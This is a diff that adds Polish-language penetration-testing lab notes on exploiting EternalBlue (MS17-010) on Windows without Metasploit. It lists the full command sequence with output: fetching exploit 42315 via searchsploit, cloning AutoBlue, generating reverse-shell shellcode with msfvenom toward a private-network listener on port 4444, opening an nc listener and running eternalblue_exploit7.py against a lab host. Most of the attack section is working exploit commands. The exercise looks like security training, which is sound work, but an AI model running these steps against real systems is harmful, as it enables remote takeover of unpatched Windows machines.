@@ -160,3 +160,117 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 
 ```
+
+Bez Metasploit
+
+```shell
+searchsploit -m windows/remote/42315.py 
+  Exploit: Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)
+      URL: https://www.exploit-db.com/exploits/42315
+     Path: /usr/share/exploitdb/exploits/windows/remote/42315.py
+    Codes: CVE-2017-0144
+ Verified: True
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/workspace/zadanie6/42315.py
+```
+
+```shell
+┌──(kali㉿kali)-[~/workspace/zadanie6]
+└─$ wget --no-check-certificate https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py 
+--2023-02-19 14:57:26--  https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+WARNING: The certificate of ‘raw.githubusercontent.com’ is not trusted.
+WARNING: The certificate of ‘raw.githubusercontent.com’ doesn't have a known issuer.
+HTTP request sent, awaiting response... 200 OK
+Length: 16669 (16K) [text/plain]
+Saving to: ‘mysmb.py’
+
+mysmb.py                               82%[============================================================>             ]  13.46K  --.-KB/s    in 0.004s  
+
+2023-02-19 14:57:27 (2.93 MB/s) - Read error at byte 13780/16669 (Error in the pull function.). Retrying.
+
+--2023-02-19 14:57:28--  (try: 2)  https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+WARNING: The certificate of ‘raw.githubusercontent.com’ is not trusted.
+WARNING: The certificate of ‘raw.githubusercontent.com’ doesn't have a known issuer.
+HTTP request sent, awaiting response... 307 Temporary Redirect
+Location: https://172.16.16.16:8090/ips/block/webcat?cat=71&pl=1&url=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dvcmF3aXQvTVMxNy0wMTAvbWFzdGVyL215c21iLnB5 [following]
+--2023-02-19 14:57:28--  https://172.16.16.16:8090/ips/block/webcat?cat=71&pl=1&url=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dvcmF3aXQvTVMxNy0wMTAvbWFzdGVyL215c21iLnB5
+Connecting to 172.16.16.16:8090... connected.
+WARNING: The certificate of ‘172.16.16.16’ is not trusted.
+WARNING: The certificate of ‘172.16.16.16’ doesn't have a known issuer.
+HTTP request sent, awaiting response... 403 Forbidden
+2023-02-19 14:57:28 ERROR 403: Forbidden.
+```
+
+# Bez msfconsole
+Klonujemy AutoBlue
+```shell
+git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+
+cd ~/git/AutoBlue-MS17-010/shellcode
+```
+
+Przygotowujemy Payload
+```shell
+./shell_prep.sh
+
+                 _.-;;-._
+          '-..-'|   ||   |
+          '-..-'|_.-;;-._|
+          '-..-'|   ||   |
+          '-..-'|_.-''-._|   
+Eternal Blue Windows Shellcode Compiler
+
+Let's compile them windoos shellcodezzz
+
+Compiling x64 kernel shellcode
+Compiling x86 kernel shellcode
+kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
+y
+LHOST for reverse connection:
+192.168.179.129
+LPORT you want x64 to listen on:
+4444
+LPORT you want x86 to listen on:
+4444
+Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
+1
+Type 0 to generate a staged payload or 1 to generate a stageless payload
+1
+
+Generating x64 cmd shell (stageless)...
+
+msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=192.168.179.129 LPORT=4444
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Saved as: sc_x64_msf.bin
+
+Generating x86 cmd shell (stageless)...
+
+msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=192.168.179.129 LPORT=4444
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Saved as: sc_x86_msf.bin
+
+MERGING SHELLCODE WOOOO!!!
+DONE
+```
+
+Uruchamiamy w osobnym terminalach netcat listaner na porice 4444
+```shell
+nc -lvnp 4444
+```
+oraz w osobnym terminalu uruchamiany skrypt eternalblue_exploit7.py
+
+```shell
+cd /home/kali/git/AutoBlue-MS17-010
+python eternalblue_exploit7.py 192.168.179.133 shellcode/sc_x64.bin
+```
+
+![02048fa277dbb3819daa9e3cd00ff9db.png](_resources/02048fa277dbb3819daa9e3cd00ff9db.png)
